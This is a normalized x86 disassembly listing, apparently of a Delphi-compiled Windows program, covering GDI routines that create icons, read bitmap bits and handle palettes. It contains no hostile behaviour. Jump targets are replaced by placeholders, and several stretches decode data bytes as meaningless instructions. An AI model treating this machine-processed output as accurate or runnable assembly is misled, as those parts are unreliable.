mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407cd4
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_42638f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_425e60
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407cd4
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_42636c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426373
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4026ec
retn
call sub_4255d0
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_42601c
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_426028
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_4263d8
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_425558
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b34
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_425808
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_4264bc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_4263d8
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_426528
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_4263d8
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4265c5
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4265cc
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_4265fc
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402b34
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402b34
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_4265f0
xor edx edx
push ebp
push sub_4267ea
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_4264bc
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_4264bc
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_4267c3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407cd4
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407cd4
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407cd4
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407cd4
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_426528
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_426528
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4267ca
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4026ec
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4026ec
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4026ec
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4026ec
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_4267ca
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4267f1
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_4267f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_426848
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_4268a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_426848
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4268e9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_403070
mov edi eax
mov eax esi
call sub_403070
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_426a23
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_426a06
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407e00
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426a0d
mov al 0x1
sub_4269c8
push ds
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407e00
test al al
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426a0d
sub_426a3c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41b300
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426a84
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426a8b
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_426a90
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_426ac4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41b300
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426b0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426b16
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_426b40
push cs
or edx [ esi + eax * 2 + 0x69 ]
insb
inc esi
outsd
jb r-xdata
push 0xd8004189
popad
je r-xdata
ror [ eax ] 0xe8
xor eax 0x8bfffdf0
popad
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lea eax [ eax ]
mov ah 0x6b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
imul eax [ edx ] 0x10
add [ eax ] al
add [ esi + ebx * 2 + 0x41 ] ah
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
xchg esp eax
dec ebp
clc
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
test [ ecx ] eax
push esp
xchg [ ecx ] al
adc [ esi + eax * 2 + 0x69 ] dl
insb
inc esi
outsd
jb r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ebp * 2 - 0x78d7ffbe ] cl
inc ecx
add [ eax - 0x77 ] ch
inc ecx
add al bl
mov edx r-xdata
mov eax esi
call sub_426d58
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_426d58
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_426d58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426cbc
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403edc
retn
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_426cb5
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_4030f8
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_426d58
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x8 ]
add esp 0xfffffff0
call sub_40348c
sub_426bd8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_426cb5
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_4030f8
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_426d58
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_426d58
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_426d58
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_426d58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426cbc
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403edc
retn
add esp 0xfffffff0
call sub_40348c
sub_426d58
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_426ddb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_404c8c
mov esi eax
mov ebx esi
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_407ecc
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_403f0c
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_403f0c
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov edx esi
mov eax edi
call sub_4185a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426de2
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
sub_426dec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_404368
xor eax eax
push ebp
push sub_426e73
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407ecc
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_403f50
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor ebx ebx
mov edx ebx
mov eax edi
call sub_418700
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4042c4
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov ebx [ esi ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426e7a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403edc
retn
sub_426e84
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_426f02
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_418700
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_403078
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_40411c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4042c4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426f09
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_426f14
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x10 ] ebx
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427093
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_403eb8
mov eax [ ebp + 0x8 ]
call sub_403eb8
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
cmp [ ebp - 0xc ] 0x1
jle r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_418700
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_403354
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42709a
lea eax [ ebp - 0x3c ]
call sub_403eb8
lea eax [ ebp - 0x10 ]
call sub_403eb8
retn
push 0x2
lea edx [ ebp - 0x3c ]
mov eax [ rw-data ]
call sub_405c78
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_408f5c
dec esi
cmp esi 0xffffffff
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
mov ebx eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404180
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_404180
mov eax [ ebp + 0x8 ]
push 0x2
mov eax [ edi ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_408f5c
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea ecx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_408f5c
inc [ ebp - 0xc ]
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xc ]
call sub_4084fc
mov edx [ ebp - 0x10 ]
lea eax [ ebx + 0x8 ]
call sub_403f0c
sub_427160
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_42720c
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_42720c
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_42720c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4271e0
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403128
mov eax [ esi + 0x8 ]
call sub_403128
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_427213
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_4185a4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_427250
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4185a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4272b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
call sub_427274
call sub_427294
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4272f4
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418ce8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_427324
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_403070
mov edx eax
mov eax [ ebx + 0xc ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418df8
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_427358
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_4032b4
